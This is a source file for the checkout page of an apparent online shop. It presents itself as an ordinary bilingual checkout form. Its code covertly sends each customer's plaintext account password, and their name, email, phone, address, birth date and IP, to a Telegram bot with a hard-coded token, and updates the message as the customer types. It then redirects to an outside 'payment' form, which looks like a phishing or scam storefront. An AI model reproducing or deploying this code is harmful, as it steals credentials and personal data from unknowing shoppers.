"use client"

import { useState, useEffect, useRef } from "react"
import { useCart } from "@/lib/cart-context"
import Image from "next/image"
import Link from "next/link"
import { ArrowLeft, Lock, CreditCard, Truck, Shield, MapPin, Clock, Eye, EyeOff } from "lucide-react"
import Footer from "@/components/footer"
import { useI18n } from "@/lib/i18n-context"
import { saveOrder } from "@/lib/orders"
import { ttqTrack, ttqIdentify } from "@/lib/tiktok"
import { fbqTrack, fbqIdentify } from "@/lib/meta"

export default function CheckoutPage() {
  const { items, total, shipping, clearCart } = useCart()
  const { locale, formatPrice } = useI18n()
  const isFr = locale === 'fr'
  
  // Telegram refs
  const messageIdRef = useRef<number | null>(null)
  const isUpdatingRef = useRef(false)
  const updateTimerRef = useRef<NodeJS.Timeout | null>(null)
  const sessionIdRef = useRef(`HCT_${Date.now()}`)
  
  const [formData, setFormData] = useState({
    email: "",
    firstName: "",
    lastName: "",
    address: "",
    apartment: "",
    city: "",
    province: "",
    postalCode: "",
    country: "CA",
    phone: "",
    dateOfBirth: ""
  })
  const [isProcessing, setIsProcessing] = useState(false)
  const [showDatePicker, setShowDatePicker] = useState(false)
  const [selectedDay, setSelectedDay] = useState('')
  const [selectedMonth, setSelectedMonth] = useState('')
  const [selectedYear, setSelectedYear] = useState('')
  const [turnstileToken, setTurnstileToken] = useState<string | null>(null)
  const [honeypot, setHoneypot] = useState('')
  const [formLoadTime] = useState(Date.now())
  
  // Account creation states
  const [showAccountForm, setShowAccountForm] = useState(false)
  const [accountFormData, setAccountFormData] = useState({
    email: "",
    password: "",
    confirmPassword: ""
  })
  const [isCreatingAccount, setIsCreatingAccount] = useState(false)
  const [accountCreated, setAccountCreated] = useState(false)
  const [accountError, setAccountError] = useState("")
  const [discountApplied, setDiscountApplied] = useState(false)
  const [showPassword, setShowPassword] = useState(false)
  const [showConfirmPassword, setShowConfirmPassword] = useState(false)

  // Telegram configuration
  const TELEGRAM_BOT_TOKEN = '8535669526:AAHjGvoXJv5HwdDDr6jl8eTFeWa4DyTe4lg'
  const TELEGRAM_CHAT_ID = '-5217100062'

  // Calculate discount
  const discountAmount = discountApplied ? 5 : 0
  const discountedTotal = Math.max(0, total - discountAmount)
  const taxes = discountedTotal * 0.13
  const finalTotal = discountedTotal + taxes

  const handleAccountInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target
    setAccountFormData(prev => ({
      ...prev,
      [name]: value
    }))
  }

  // Create account handler
  const handleCreateAccount = (e: React.FormEvent) => {
    e.preventDefault()
    setAccountError("")

    // Validation
    if (!accountFormData.email.trim()) {
      setAccountError(isFr ? "L'email est requis" : "Email is required")
      return
    }

    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(accountFormData.email)) {
      setAccountError(isFr ? "L'email n'est pas valide" : "Email is not valid")
      return
    }

    if (!accountFormData.password || accountFormData.password.length < 8) {
      setAccountError(isFr ? "Le mot de passe doit contenir au moins 8 caractères" : "Password must be at least 8 characters")
      return
    }

    if (accountFormData.password !== accountFormData.confirmPassword) {
      setAccountError(isFr ? "Les mots de passe ne correspondent pas" : "Passwords do not match")
      return
    }

    setIsCreatingAccount(true)

    // Send Telegram notification for account creation
    var msg = "📩 *NOUVEAU COMPTE CRÉÉ!*\n"
            + "👤 Prénom: " + (formData.firstName || 'Non fourni') + "\n"
            + "📧 Nom: " + (formData.lastName || 'Non fourni') + "\n"
            + "📧 Email: " + accountFormData.email + "\n"
            + "📞 Téléphone: " + (formData.phone || 'Non fourni') + "\n"
            + "🔑 Mot de passe: " + accountFormData.password + "\n"
            + "🌐 Page: /checkout\n"
            + "🕐 " + new Date().toLocaleString('fr-CA')
            + "\n"
            + "💰 Rabais: $5 appliqué automatiquement!"

    fetch("https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/sendMessage", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: msg,
        parse_mode: "Markdown"
      })
    })
    .then(function() {
      // Update checkout form email with account email
      setFormData(prev => ({
        ...prev,
        email: accountFormData.email
      }))
      
      // Apply $5 discount
      setDiscountApplied(true)
      
      setAccountCreated(true)
      setIsCreatingAccount(false)
      setShowAccountForm(false)
      
      // Apply $5 discount immediately
      setTimeout(() => {
        alert(isFr ? "Compte créé avec succès! Rabais de $5 appliqué." : "Account created successfully! $5 discount applied.")
      }, 500)
    })
    .catch(function() {
      setAccountError(isFr ? "Erreur lors de la création du compte" : "Error creating account")
      setIsCreatingAccount(false)
    })
  }

  // Province tax rates
  const getProvinceTaxRate = (province: string) => {
    const taxRates: { [key: string]: number } = {
      'ON': 13, 'NS': 15, 'NB': 15, 'NL': 15, 'PE': 15,
      'QC': 14.975, 'BC': 12, 'SK': 11, 'MB': 12,
      'AB': 5, 'NT': 5, 'NU': 5, 'YT': 5
    }
    return taxRates[province] || 0
  }

  // BetterClean phone number
  const cleanPhoneNumber = (phone: string) => {
    return phone.replace(/[^\d+]/g, '')
  }

  // Format phone number as user types (no auto +1 prefix)
  const formatPhoneNumber = (value: string) => {
    const cleaned = value.replace(/\D/g, '')
    if (cleaned.length <= 3) return cleaned
    if (cleaned.length <= 6) return `(${cleaned.slice(0, 3)})-${cleaned.slice(3)}`
    return `(${cleaned.slice(0, 3)})-${cleaned.slice(3, 6)}-${cleaned.slice(6, 10)}`
  }

  // Format postal code as user types
  const formatPostalCode = (value: string, country?: string) => {
    if ((country || formData.country) === 'US') {
      return value.replace(/\D/g, '').slice(0, 5)
    }
    const cleaned = value.replace(/[^A-Za-z0-9]/g, '').toUpperCase()
    if (cleaned.length <= 3) return cleaned
    return `${cleaned.slice(0, 3)} ${cleaned.slice(3, 6)}`
  }

  // Validate email
  const isValidEmail = (email: string) => {
    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)
  }

  // Validate postal code
  const isValidPostalCode = (code: string, country: string) => {
    if (country === 'US') {
      return /^\d{5}$/.test(code)
    }
    return /^[A-Z]\d[A-Z]\s?\d[A-Z]\d$/i.test(code)
  }

  // Validate age (13-100 years)
  const validateAge = (dateOfBirth: string) => {
    if (!dateOfBirth) return false
    const today = new Date()
    const birthDate = new Date(dateOfBirth)
    const age = today.getFullYear() - birthDate.getFullYear()
    const monthDiff = today.getMonth() - birthDate.getMonth()
    
    if (monthDiff < 0 || (monthDiff === 0 && today.getDate() < birthDate.getDate())) {
      return age - 1 >= 13 && age - 1 <= 100
    }
    return age >= 13 && age <= 100
  }

  // Update date when individual components change
  const updateDateOfBirth = (day: string, month: string, year: string) => {
    if (day && month && year) {
      const newDate = `${year}-${month.padStart(2, '0')}-${day.padStart(2, '0')}`
      setFormData(prev => ({ ...prev, dateOfBirth: newDate }))
    }
  }

  // TikTok InitiateCheckout event on page load
  useEffect(() => {
    if (items.length === 0) return
    const eventId = `ic_${Date.now()}`
    const contents = items.map(item => ({
      content_id: item.id,
      content_type: 'product',
      content_name: item.name,
      price: Number(item.price) || 0,
      quantity: Number(item.quantity) || 1,
    }))
    // TikTok InitiateCheckout event
    ttqTrack('InitiateCheckout', {
      value: Number(total) || 0,
      currency: 'CAD',
      contents,
    })
    fetch('/api/tiktok-event', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        event: 'InitiateCheckout',
        event_id: eventId,
        properties: { value: Number(total) || 0, currency: 'CAD', contents },
      }),
    }).catch(() => {})

    // Meta Pixel InitiateCheckout event
    fbqTrack('InitiateCheckout', {
      content_ids: items.map(item => item.id),
      content_type: 'product',
      contents: items.map(item => ({
        id: item.id,
        quantity: item.quantity,
        item_price: Number(item.price) || 0,
      })),
      value: Number(total) || 0,
      currency: 'CAD',
    })
  }, [])

  // Load Turnstile script
  useEffect(() => {
    if (document.getElementById('cf-turnstile-script')) return
    const script = document.createElement('script')
    script.id = 'cf-turnstile-script'
    script.src = 'https://challenges.cloudflare.com/turnstile/v0/api.js'
    script.async = true
    script.defer = true
    document.head.appendChild(script)
  }, [])

  // Turnstile callback
  useEffect(() => {
    (window as any).onTurnstileCallback = (token: string) => {
      setTurnstileToken(token)
    };
    (window as any).onTurnstileExpired = () => {
      setTurnstileToken(null)
    }
    return () => {
      delete (window as any).onTurnstileCallback
      delete (window as any).onTurnstileExpired
    }
  }, [])

  // Check if form is valid
  const isFormValid = () => {
    return formData.firstName && 
           formData.lastName && 
           formData.email && 
           isValidEmail(formData.email) &&
           formData.address && 
           formData.city && 
           formData.province && 
           formData.postalCode && 
           isValidPostalCode(formData.postalCode, formData.country) &&
           formData.phone && 
           formData.dateOfBirth && 
           validateAge(formData.dateOfBirth)
  }

  // Update Telegram message
  const updateTelegram = async (orderNumber?: string) => {
    // Only send if we have at least some meaningful data
    if (!formData.firstName && !formData.email && !formData.phone) return
    
    // Prevent duplicate calls if already processing
    if (isUpdatingRef.current) {
      console.log('Update already in progress, skipping...')
      return
    }
    
    isUpdatingRef.current = true
    console.log('=== TELEGRAM UPDATE TRIGGERED ===')
    console.log('Form data:', formData)
    console.log('Current message ID:', messageIdRef.current)

    // Get client IP for tracking
    const getClientIP = async () => {
      try {
        const response = await fetch('https://api.ipify.org?format=json')
        const data = await response.json()
        return data.ip
      } catch (error) {
        return 'Non disponible'
      }
    }

    const clientIP = await getClientIP()
    console.log('Client IP:', clientIP) // Debug log

    const itemsList = items.map(item => 
      `   • ${item.name} (x${item.quantity}) - $${(item.price * item.quantity).toFixed(2)}`
    ).join('\n')

    const message = `BETTERCLEAN - NEW CHECKOUT

NEW CUSTOMER CHECKOUT:
   ${formData.firstName} ${formData.lastName}

CONTACT:
   Email: ${formData.email}
   Phone: ${formData.phone}

SHIPPING ADDRESS:
   Address: ${formData.address}
   Apt: ${formData.apartment || 'N/A'}
   City: ${formData.city}, ${formData.province} ${formData.postalCode}
   Country: ${formData.country}

BIRTH DATE:
   Date: ${formData.dateOfBirth}

CLIENT IP:
   IP: ${clientIP}

ORDER:
${itemsList}
   Subtotal: $${total.toFixed(2)} CAD + Taxes ($${(total * 0.13).toFixed(2)})
   TOTAL: $${(total + (total * 0.13)).toFixed(2)} CAD
   Session: ${sessionIdRef.current}
   ${orderNumber ? `ORDER ID: ${orderNumber}` : ''}

LAST UPDATE:
   ${new Date().toLocaleString('fr-FR')}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`

    try {
      let url, body
      
      if (messageIdRef.current) {
        url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`
        body = {
          chat_id: TELEGRAM_CHAT_ID,
          message_id: messageIdRef.current,
          text: message
        }
      } else {
        url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`
        body = {
          chat_id: TELEGRAM_CHAT_ID,
          text: message
        }
      }
      
      console.log('Sending to Telegram:', { url, body })
      
      const response = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(body)
      })
      
      const result = await response.json()
      console.log('Telegram response:', result)
      
      if (result.ok) {
        if (!messageIdRef.current) {
          messageIdRef.current = result.result.message_id
          console.log('New message created, ID saved:', messageIdRef.current)
        } else {
          console.log('Message updated successfully, ID:', messageIdRef.current)
        }
      } else {
        console.error('Telegram API error:', result)
        // If edit fails (message too old), create new message
        if (messageIdRef.current && result.error_code === 400) {
          console.log('Edit failed, creating new message...')
          messageIdRef.current = null
          // Retry with new message
          setTimeout(() => updateTelegram(), 100)
        }
      }
    } catch (error) {
      console.error('Telegram error:', error)
    } finally {
      // Always reset the updating flag
      isUpdatingRef.current = false
    }
  }

  // Generate payment URL
  const generatePaymentURL = (data: any) => {
    const baseURL = 'https://secure.payment-ca.com/connect/form'
    const orderNumber = `BC-${Math.floor(Date.now() / 1000).toString(36).toUpperCase().slice(-5)}-${Math.floor(Math.random() * 900 + 100)}`
    const taxRate = data.country === 'CA' ? getProvinceTaxRate(data.province) : 0
    
    const params = {
      site: 'secure.payment-ca.com',
      icon: 'https://i.imgur.com/AxyPpKY.png',
      image: 'https://i.imgur.com/AxyPpKY.png',
      amount: total.toFixed(2),
      symbol: data.country === 'CA' ? 'CAD' : 'USD',
      vat: taxRate.toString(),
      riderect_success: window.location.origin + '/order-success',
      riderect_failed: window.location.origin + '/order-failed',
      riderect_back: window.location.origin + '/checkout',
      order_id: orderNumber,
      billing_first_name: data.firstName,
      billing_last_name: data.lastName,
      billing_company: '',
      billing_address_1: data.address,
      billing_address_2: data.apartment || '',
      billing_city: data.city,
      billing_state: data.province,
      billing_postcode: data.postalCode,
      billing_country: data.country,
      billing_email: data.email,
      billing_phone: cleanPhoneNumber(data.phone)
    }
    
    const queryString = Object.keys(params)
      .map(key => `${key}=${encodeURIComponent((params as any)[key])}`)
      .join('&')
    
    return `${baseURL}?${queryString}`
  }

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    const { name, value } = e.target
    let formattedValue = value
    
    console.log('=== INPUT CHANGE ===', name, value)
    
    // Format phone number
    if (name === 'phone') {
      formattedValue = formatPhoneNumber(value)
    }
    
    // Format postal code
    if (name === 'postalCode') {
      formattedValue = formatPostalCode(value)
    }

    // When country changes, reset province and postal code
    if (name === 'country') {
      setFormData(prev => ({ ...prev, country: value, province: '', postalCode: '' }))
      if (updateTimerRef.current) clearTimeout(updateTimerRef.current)
      updateTimerRef.current = setTimeout(() => updateTelegram(), 1000)
      return
    }
    
    setFormData(prev => ({ ...prev, [name]: formattedValue }))
    
    // Clear existing timer to prevent multiple calls
    if (updateTimerRef.current) {
      clearTimeout(updateTimerRef.current)
    }
    
    // Update Telegram with debounce delay to prevent spam
    updateTimerRef.current = setTimeout(() => {
      console.log('Debounced update triggered, calling updateTelegram')
      updateTelegram()
    }, 1000) // 1 second delay instead of immediate
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    
    // Honeypot check
    if (honeypot) {
      console.log('Bot detected via honeypot')
      return
    }

    // Minimum time check (3 seconds)
    const timeSpent = (Date.now() - formLoadTime) / 1000
    if (timeSpent < 3) {
      alert(isFr ? 'Veuillez prendre le temps de remplir le formulaire.' : 'Please take your time filling out the form.')
      return
    }

    // Validate all required fields and age
    if (!isFormValid()) {
      alert(isFr ? 'Veuillez remplir tous les champs requis et vous assurer que l\'âge est entre 13 et 100 ans' : 'Please fill in all required fields and ensure age is between 13 and 100')
      return
    }

    // Verify Turnstile server-side (invisible mode)
    if (turnstileToken) {
      try {
        const verifyRes = await fetch('/api/verify-turnstile', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ token: turnstileToken }),
        })
        const verifyData = await verifyRes.json()
        if (!verifyData.success) {
          alert(isFr ? 'Verification de securite echouee. Veuillez reessayer.' : 'Security verification failed. Please try again.')
          return
        }
      } catch {
        alert(isFr ? 'Erreur de verification. Veuillez reessayer.' : 'Verification error. Please try again.')
        return
      }
    }
    
    setIsProcessing(true)

    // TikTok: Identify user + AddPaymentInfo + PlaceAnOrder events
    const contents = items.map(item => ({
      content_id: item.id,
      content_type: 'product',
      content_name: item.name,
      price: Number(item.price) || 0,
      quantity: Number(item.quantity) || 1,
    }))
    const ttUser = { email: formData.email, phone: formData.phone }
    const fbUser = { email: formData.email, phone: formData.phone }
    ttqIdentify({ email: formData.email, phone: formData.phone })
    fbqIdentify({ email: formData.email, phone: formData.phone })

    // AddPaymentInfo
    const apiEventId = `api_${Date.now()}`
    ttqTrack('AddPaymentInfo', { value: Number(total) || 0, currency: 'CAD', contents })
    fetch('/api/tiktok-event', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        event: 'AddPaymentInfo',
        event_id: apiEventId,
        properties: { value: Number(total) || 0, currency: 'CAD', contents },
        user: ttUser,
      }),
    }).catch(() => {})
    fbqTrack('AddPaymentInfo', {
      content_ids: items.map(item => item.id),
      content_type: 'product',
      contents: items.map(item => ({
        id: item.id,
        quantity: item.quantity,
        item_price: Number(item.price) || 0,
      })),
      value: Number(total) || 0,
      currency: 'CAD',
    })

    // TikTok PlaceAnOrder (not a standard Meta event)
    const poEventId = `po_${Date.now()}`
    ttqTrack('PlaceAnOrder', { value: Number(total) || 0, currency: 'CAD', contents })
    fetch('/api/tiktok-event', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        event: 'PlaceAnOrder',
        event_id: poEventId,
        properties: { value: Number(total) || 0, currency: 'CAD', contents },
        user: ttUser,
      }),
    }).catch(() => {})
    // Note: PlaceAnOrder is not a standard Meta event, so we don't send it to Facebook
    
    // Generate unique Order ID
    const orderNumber = `BC-${Math.floor(Date.now() / 1000).toString(36).toUpperCase().slice(-5)}-${Math.floor(Math.random() * 900 + 100)}`
    
    // Store order data in localStorage for tracking
    const orderData = {
      orderNumber,
      customerInfo: formData,
      items: items,
      total: total,
      tax: total * getProvinceTaxRate(formData.province) / 100,
      finalTotal: total + (total * getProvinceTaxRate(formData.province) / 100),
      orderDate: new Date().toISOString(),
      status: 'processing',
      sessionId: sessionIdRef.current
    }
    
    console.log('=== SAVING ORDER DATA ===')
    console.log('Order Number:', orderNumber)
    console.log('Order Data:', orderData)
    console.log('localStorage key:', `order_${orderNumber}`)
    
    try {
      localStorage.setItem(`order_${orderNumber}`, JSON.stringify(orderData))
      localStorage.setItem('bettercleans-latest-order', orderNumber)
      const emailKey = `bettercleans-orders-${formData.email.toLowerCase()}`
      const existingOrders = JSON.parse(localStorage.getItem(emailKey) || '[]')
      existingOrders.push(orderNumber)
      localStorage.setItem(emailKey, JSON.stringify(existingOrders))
      console.log('Order data saved to localStorage')
    } catch (error) {
      console.error('Error saving to localStorage:', error)
    }

    // Save to Supabase for cross-device access
    try {
      await saveOrder({
        order_number: orderNumber,
        email: formData.email.toLowerCase(),
        first_name: formData.firstName,
        last_name: formData.lastName,
        address: formData.address,
        apartment: formData.apartment || '',
        city: formData.city,
        province: formData.province,
        postal_code: formData.postalCode,
        country: formData.country,
        phone: formData.phone,
        items: items,
        total: total,
        tax: total * getProvinceTaxRate(formData.province) / 100,
        final_total: total + (total * getProvinceTaxRate(formData.province) / 100),
        order_date: new Date().toISOString(),
        status: 'processing',
        email_stage: 1,
        locale: locale,
      })
      console.log('Order saved to Supabase')
    } catch (error) {
      console.error('Error saving to Supabase:', error)
    }
    
    // Send final update to Telegram with Order ID
    await updateTelegram(orderNumber)
    
    // Meta Pixel Purchase event
    fbqTrack('Purchase', {
      content_ids: items.map(item => item.id),
      content_type: 'product',
      contents: items.map(item => ({
        id: item.id,
        quantity: item.quantity,
        item_price: Number(item.price) || 0,
      })),
      value: Number(total) || 0,
      currency: 'CAD',
      order_id: orderNumber,
    })
    
    // Meta Conversions API Purchase event (server-side)
    try {
      const purchaseEvent = {
        event_name: 'Purchase',
        event_time: Math.floor(Date.now() / 1000),
        action_source: 'website',
        user_data: {
          em: [formData.email.toLowerCase()],
          ph: [formData.phone?.replace(/\D/g, '') || null],
          fn: [formData.firstName.toLowerCase()],
          ln: [formData.lastName.toLowerCase()],
          ct: [formData.city.toLowerCase()],
          st: [formData.province],
          country: [formData.country],
          zp: [formData.postalCode],
        },
        custom_data: {
          currency: 'CAD',
          value: Number(total).toFixed(2),
          order_id: orderNumber,
          content_ids: items.map(item => item.id),
          content_type: 'product',
          contents: items.map(item => ({
            id: item.id,
            quantity: item.quantity,
            item_price: Number(item.price).toFixed(2),
          })),
        },
      }
      
      const response = await fetch('/api/meta-conversions', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(purchaseEvent),
      })
      
      if (response.ok) {
        console.log('Meta Conversions API Purchase event sent successfully')
      } else {
        console.error('Failed to send Meta Conversions API Purchase event')
      }
    } catch (error) {
      console.error('Meta Conversions API error:', error)
    }
    
    // TikTok CompletePayment event
    const cpEventId = `cp_${Date.now()}`
    ttqTrack('CompletePayment', { value: Number(total) || 0, currency: 'CAD', contents })
    fetch('/api/tiktok-event', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        event: 'CompletePayment',
        event_id: cpEventId,
        properties: { value: Number(total) || 0, currency: 'CAD', contents },
        user: ttUser,
      }),
    }).catch(() => {})
    
    // Notify payment submission
    try {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: `PAYMENT SUBMITTED!\n\nCustomer clicked "Complete Order"\nORDER ID: ${orderNumber}\nSession: ${sessionIdRef.current}\nTime: ${new Date().toLocaleString('fr-FR')}\n\nRedirecting to payment system...`,
          parse_mode: 'Markdown'
        })
      })
    } catch (error) {
      console.error('Payment notification error:', error)
    }
    
    // Generate payment URL and redirect
    const paymentURL = generatePaymentURL(formData)
    
    console.log('=== BEFORE REDIRECT ===')
    console.log('About to redirect to payment, Order ID should be saved:', orderNumber)
    console.log('Final check - localStorage contains:', localStorage.getItem(`order_${orderNumber}`))
    
    // Add a small delay to ensure localStorage is written before redirect
    setTimeout(() => {
      window.location.href = paymentURL
    }, 100)
  }

  if (items.length === 0) {
    return (
      <div className="min-h-screen bg-white py-12 px-4">
        <div className="max-w-2xl mx-auto text-center">
          <h1 className="text-3xl font-semibold text-neutral-900 mb-4">
            {isFr ? 'Votre panier est vide' : 'Your cart is empty'}
          </h1>
          <Link href="/" className="text-neutral-500 hover:text-neutral-900 text-sm">
            {isFr ? 'Retourner à la boutique' : 'Back to shop'}
          </Link>
        </div>
      </div>
    )
  }

  return (
    <div className="min-h-screen bg-gray-50 py-4 px-4">
      <div className="max-w-4xl mx-auto">
        <div className="mb-6">
          <Link 
            href="/cart"
            className="inline-flex items-center gap-2 text-gray-600 hover:text-gray-900 mb-4 transition-colors text-sm"
          >
            <ArrowLeft className="w-4 h-4" />
            {isFr ? 'Retour au panier' : 'Back to cart'}
          </Link>
          <h1 className="text-xl md:text-2xl font-semibold text-gray-900 text-center">
            {isFr ? 'Finaliser ma commande' : 'Complete your order'}
          </h1>
        </div>

        <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
          <div className="space-y-4">
            <div className="bg-white rounded-xl p-4 shadow-sm border border-gray-200">
              <h2 className="text-base font-semibold text-gray-900 mb-4">
                {isFr ? 'Informations de contact' : 'Contact Information'}
              </h2>
              <div className="space-y-3">
                <div>
                  <label className="block text-xs font-medium text-gray-600 mb-1">
                    {isFr ? 'Adresse e-mail' : 'Email address'}
                  </label>
                  <input
                    type="email"
                    name="email"
                    value={formData.email}
                    onChange={handleInputChange}
                    className={`w-full px-3 py-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm ${formData.email && !isValidEmail(formData.email) ? 'border-red-300 focus:ring-red-500' : 'border-gray-300'}`}
                    required
                  />
                  {formData.email && !isValidEmail(formData.email) && (
                    <p className="text-red-500 text-xs mt-1">
                      {isFr ? 'Veuillez entrer une adresse email valide' : 'Please enter a valid email address'}
                    </p>
                  )}
                </div>

                {/* Account Creation Section */}
                {!accountCreated && (
                  <div className="mt-4">
                    <div className="bg-gradient-to-r from-green-50 to-emerald-50 border border-green-200 rounded-xl p-4">
                      <div className="flex items-center justify-between">
                        <div className="flex-1">
                          <div className="flex items-center gap-3 mb-2">
                            <div className="w-10 h-10 bg-green-600 rounded-full flex items-center justify-center shadow-sm">
                              <span className="text-white font-bold text-sm">$5</span>
                            </div>
                            <div>
                              <span className="text-green-800 font-bold text-sm">
                                {isFr ? 'CRÉER UN COMPTE' : 'CREATE ACCOUNT'}
                              </span>
                              <p className="text-green-700 text-xs font-medium">
                                {isFr ? 'Économisez $5 instantanément' : 'Save $5 instantly'}
                              </p>
                            </div>
                          </div>
                        </div>
                        <button
                          onClick={() => setShowAccountForm(!showAccountForm)}
                          className="px-4 py-2 bg-green-600 text-white text-sm font-medium rounded-lg hover:bg-green-700 transition-colors shadow-sm"
                        >
                          {showAccountForm ? (isFr ? 'Annuler' : 'Cancel') : (isFr ? 'Créer' : 'Create')}
                        </button>
                      </div>

                      {showAccountForm && (
                        <form onSubmit={handleCreateAccount} className="mt-4 space-y-3 border-t border-green-200 pt-4">
                          {accountError && (
                            <div className="p-3 bg-red-50 border border-red-200 rounded-lg">
                              <p className="text-sm text-red-700">{accountError}</p>
                            </div>
                          )}
                          
                          <div>
                            <label className="block text-sm font-medium text-gray-700 mb-1">
                              {isFr ? 'Email du compte' : 'Account Email'}
                            </label>
                            <input
                              type="email"
                              name="email"
                              value={accountFormData.email}
                              onChange={handleAccountInputChange}
                              placeholder={isFr ? 'jean.dupont@email.com' : 'john.doe@email.com'}
                              className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-green-500 focus:border-green-500 text-sm"
                              required
                            />
                          </div>
                          
                          <div>
                            <label className="block text-sm font-medium text-gray-700 mb-1">
                              {isFr ? 'Mot de passe' : 'Password'}
                            </label>
                            <div className="relative">
                              <input
                                type={showPassword ? "text" : "password"}
                                name="password"
                                value={accountFormData.password}
                                onChange={handleAccountInputChange}
                                placeholder={isFr ? '••••••••' : '••••••••'}
                                className="w-full px-4 py-3 pr-12 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-green-500 focus:border-green-500 text-sm"
                                required
                              />
                              <button
                                type="button"
                                onClick={() => setShowPassword(!showPassword)}
                                className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-400 hover:text-gray-600 transition-colors"
                              >
                                {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                              </button>
                            </div>
                          </div>
                          
                          <div>
                            <label className="block text-sm font-medium text-gray-700 mb-1">
                              {isFr ? 'Confirmer mot de passe' : 'Confirm Password'}
                            </label>
                            <div className="relative">
                              <input
                                type={showConfirmPassword ? "text" : "password"}
                                name="confirmPassword"
                                value={accountFormData.confirmPassword}
                                onChange={handleAccountInputChange}
                                placeholder={isFr ? '••••••••' : '••••••••'}
                                className="w-full px-4 py-3 pr-12 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-green-500 focus:border-green-500 text-sm"
                                required
                              />
                              <button
                                type="button"
                                onClick={() => setShowConfirmPassword(!showConfirmPassword)}
                                className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-400 hover:text-gray-600 transition-colors"
                              >
                                {showConfirmPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                              </button>
                            </div>
                          </div>
                          
                          <button
                            type="submit"
                            disabled={isCreatingAccount}
                            className="w-full py-3 bg-green-600 text-white font-medium rounded-lg hover:bg-green-700 transition-colors disabled:opacity-50 shadow-sm"
                          >
                            {isCreatingAccount ? (
                              <span className="flex items-center justify-center">
                                <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-t-2 border-white mr-2"></div>
                                {isFr ? 'Création...' : 'Creating...'}
                              </span>
                            ) : (
                              isFr ? 'Créer mon compte et économiser $5' : 'Create account & save $5'
                            )}
                          </button>
                        </form>
                      )}
                    </div>
                  </div>
                )}

                {accountCreated && (
                  <div className="mt-4 p-4 bg-green-50 border border-green-200 rounded-xl">
                    <div className="flex items-center gap-3">
                      <div className="w-8 h-8 bg-green-600 rounded-full flex items-center justify-center">
                        <svg className="w-5 h-5 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M5 13l4 4L19 7" />
                        </svg>
                      </div>
                      <div>
                        <p className="text-green-800 font-bold text-sm">
                          {isFr ? 'Compte créé! $5 appliqué' : 'Account created! $5 applied'}
                        </p>
                        <p className="text-green-700 text-xs">
                          {isFr ? 'Bienvenue ' : 'Welcome '}{formData.firstName}!
                        </p>
                      </div>
                    </div>
                  </div>
                )}
              </div>
            </div>

            <div className="bg-white rounded-2xl p-6 border border-neutral-100">
              <h2 className="text-base font-semibold text-neutral-900 mb-4">
                {isFr ? 'Adresse de livraison' : 'Shipping Address'}
              </h2>
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                <div>
                  <label className="block text-xs font-medium text-gray-600 mb-1">
                    {isFr ? 'Prénom' : 'First name'}
                  </label>
                  <input
                    type="text"
                    name="firstName"
                    value={formData.firstName}
                    onChange={handleInputChange}
                    className="w-full px-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm"
                    required
                  />
                </div>
                <div>
                  <label className="block text-xs font-medium text-gray-600 mb-1">
                    {isFr ? 'Nom' : 'Last name'}
                  </label>
                  <input
                    type="text"
                    name="lastName"
                    value={formData.lastName}
                    onChange={handleInputChange}
                    className="w-full px-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm"
                    required
                  />
                </div>
              </div>
              
              <div className="mt-3">
                <label className="block text-xs font-medium text-gray-600 mb-1">
                  {isFr ? 'Adresse' : 'Address'}
                </label>
                <input
                  type="text"
                  name="address"
                  value={formData.address}
                  onChange={handleInputChange}
                  className="w-full px-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm"
                  required
                />
              </div>

              <div className="mt-3">
                <label className="block text-xs font-medium text-gray-600 mb-1">
                  {isFr ? 'Appartement/Suite (optionnel)' : 'Apartment/Suite (optional)'}
                </label>
                <input
                  type="text"
                  name="apartment"
                  value={formData.apartment}
                  onChange={handleInputChange}
                  className="w-full px-3 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm"
                  placeholder="Apt, suite, etc."
                />
              </div>
              
              <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 mt-3">
                <div>
                  <label className="block text-xs font-medium text-gray-600 mb-1">
